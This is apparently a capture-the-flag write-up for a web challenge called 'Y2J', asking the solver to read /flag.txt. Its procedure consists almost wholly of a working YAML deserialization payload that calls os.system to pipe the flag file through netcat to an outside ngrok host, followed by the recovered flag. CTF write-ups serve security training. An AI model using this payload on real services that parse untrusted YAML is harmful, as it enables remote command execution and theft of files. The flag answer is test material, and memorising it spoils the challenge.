## Name: Y2J
#### Author: @JohnHammond#6971
#### Category: Web
#### Difficulty: N/D
#### Description: Everyone was so worried about Y2K, but apparently it was a typo all along!!

The real world-ending fears were from Y2J!

Find the flag.txt file in the root of the filesystem.

## Procedure
1




!!python/object/apply:os.system
args: ["cat /flag.txt |nc 2.tcp.ngrok.io 11855"]


flag{b20870a1955ac22377045e3b2dcb832a}
